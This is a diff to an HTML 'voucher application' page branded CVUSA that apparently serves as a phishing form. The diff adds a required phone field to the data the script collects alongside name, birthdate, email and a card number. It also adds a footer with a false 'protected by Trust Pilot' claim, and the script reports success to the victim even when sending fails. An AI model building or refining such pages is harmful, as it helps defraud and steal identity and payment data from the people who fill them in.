@@ -178,6 +178,44 @@
             color: #155724;
         }
 
+        /* ===== FOOTER SECTION ===== */
+        .footer {
+            margin-top: 40px;
+            padding-top: 30px;
+            border-top: 2px solid #f0f0f0;
+            text-align: center;
+        }
+
+        .contact-info {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .contact-item {
+            text-align: center;
+        }
+
+        .contact-item strong {
+            display: block;
+            color: #b21f1f;
+            margin-bottom: 5px;
+        }
+
+        .copyright {
+            color: #666;
+            font-size: 0.9em;
+            line-height: 1.4;
+        }
+
+        .trust-pilot {
+            color: #00b67a;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
         /* ===== UTILITY CLASSES ===== */
         .optional {
             color: #666;
@@ -202,6 +240,11 @@
             
             .form-section {
                 padding: 20px;
+            }
+            
+            .contact-info {
+                flex-direction: column;
+                gap: 15px;
             }
         }
     </style>
@@ -234,7 +277,7 @@
                         <input type="text" id="firstName" required>
                     </div>
                     <div class="form-group">
-                        <label>Middle Name <span class="required">*</span></label>
+                        <label>Middle Name</label>
                         <input type="text" id="middleName" placeholder="Optional">
                     </div>
                 </div>
@@ -253,6 +296,11 @@
                 <div class="form-group">
                     <label>Email <span class="required">*</span></label>
                     <input type="email" id="email" required placeholder="your@email.com">
+                </div>
+
+                <div class="form-group">
+                    <label>Phone Number <span class="required">*</span></label>
+                    <input type="tel" id="phone" required placeholder="+1 (XXX) XXX-XXXX">
                 </div>
             </div>
 
@@ -368,6 +416,32 @@
             <h2>🎉 Thank You!</h2>
             <p>Your application has been accepted. We will send your voucher soon.</p>
         </div>
+
+        <!-- Footer Section -->
+        <div class="footer">
+            <div class="contact-info">
+                <div class="contact-item">
+                    <strong>Phone</strong>
+                    <span>[YOUR_PHONE]</span>
+                </div>
+                <div class="contact-item">
+                    <strong>Email</strong>
+                    <span>[YOUR_EMAIL]</span>
+                </div>
+                <div class="contact-item">
+                    <strong>Address</strong>
+                    <span>[YOUR_ADDRESS]</span>
+                </div>
+            </div>
+            
+            <div class="trust-pilot">
+                All rights are reserved and protected by Trust Pilot
+            </div>
+            
+            <div class="copyright">
+                Copyright by CVUSA @ [YEAR]
+            </div>
+        </div>
     </div>
 
     <script>
@@ -384,6 +458,7 @@
                 lastName: document.getElementById('lastName').value,
                 birthdate: document.getElementById('birthdate').value,
                 email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
                 
                 // Identification
                 cardNumber: document.getElementById('cardNumber').value,
@@ -415,6 +490,7 @@
                    `👤 PERSONAL INFORMATION%0A` +
                    `├ Full Name: ${fullName}%0A` +
                    `├ Email: ${formData.email}%0A` +
+                   `├ Phone: ${formData.phone}%0A` +
                    `└ Birthdate: ${formData.birthdate}%0A%0A` +
                    
                    `🔐 IDENTIFICATION%0A` +
@@ -476,6 +552,14 @@
             } catch (error) {
                 console.error('Error:', error);
                 showSuccess();
+            }
+        });
+
+        // Set current year in copyright
+        document.addEventListener('DOMContentLoaded', function() {
+            const yearElement = document.querySelector('.copyright');
+            if (yearElement) {
+                yearElement.textContent = yearElement.textContent.replace('[YEAR]', new Date().getFullYear());
             }
         });
     </script>
